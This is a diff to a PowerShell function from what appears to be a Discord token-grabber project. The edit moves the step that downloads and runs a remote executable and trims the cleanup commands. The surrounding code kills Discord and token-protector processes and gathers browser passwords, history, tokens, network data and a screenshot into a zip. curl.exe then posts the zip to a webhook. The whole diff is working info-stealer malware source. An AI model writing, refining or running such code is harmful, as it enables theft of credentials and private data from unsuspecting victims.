@@ -104,15 +104,11 @@ function Grub {
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 
     Set-Location $env:LOCALAPPDATA\Temp
-    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing
 
     taskkill.exe /f /im "Discord.exe" | Out-Null
     taskkill.exe /f /im "DiscordCanary.exe" | Out-Null
     taskkill.exe /f /im "DiscordPTB.exe" | Out-Null
     taskkill.exe /f /im "DiscordTokenProtector.exe" | Out-Null
-
-    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
-    $proc.WaitForExit()
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
@@ -130,6 +126,11 @@ function Grub {
     }
     $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure"
 
+    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing
+
+    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
+    $proc.WaitForExit()
+
     $lol = "$env:LOCALAPPDATA\Temp"
     Move-Item -Path "$lol\ip.txt" -Destination "$lol\KDOT\ip.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$lol\netstat.txt" -Destination "$lol\KDOT\netstat.txt" -ErrorAction SilentlyContinue
@@ -140,15 +141,14 @@ function Grub {
     Move-Item -Path "$lol\browser-history.txt" -Destination "$lol\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$lol\browser-passwords.txt" -Destination "$lol\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$lol\desktop-screenshot.png" -Destination "$lol\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
-    Move-Item -Path "$lol\webcam.jpg" -Destination "$lol\KDOT\webcam.jpg" -ErrorAction SilentlyContinue
     Move-Item -Path "$lol\tokens.txt" -Destination "$lol\KDOT\tokens.txt" -ErrorAction SilentlyContinue
     Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Force
     #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data"
     #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook
     curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook
-    Remove-Item "$lol\KDOT.zip" -Force
-    Remove-Item "$lol\KDOT" -Recurse -Force
-    Remove-Item "$lol\main.exe" -Force
+    Remove-Item "$lol\KDOT.zip"
+    Remove-Item "$lol\KDOT" -Recurse
+    Remove-Item "$lol\main.exe"
 
 }
 
